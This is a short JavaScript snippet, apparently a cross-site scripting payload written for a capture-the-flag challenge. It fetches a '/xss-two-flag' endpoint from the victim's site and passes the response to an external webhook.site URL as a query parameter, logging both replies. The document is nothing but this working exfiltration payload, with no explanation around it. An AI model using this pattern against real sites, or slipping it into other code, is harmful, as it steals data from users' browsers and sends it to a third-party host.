fetch('/xss-two-flag')
  .then(response => response.json())
  .then(data1 => {
    console.log(data1);
    return fetch(`https://webhook.site/054dd353-fdfa-452f-9788-f10aa127039c?id=${data1}`);
  })
  .then(response => response.json())
  .then(data2 => {
    console.log(data2);
  })
  .catch(error => console.error(error));
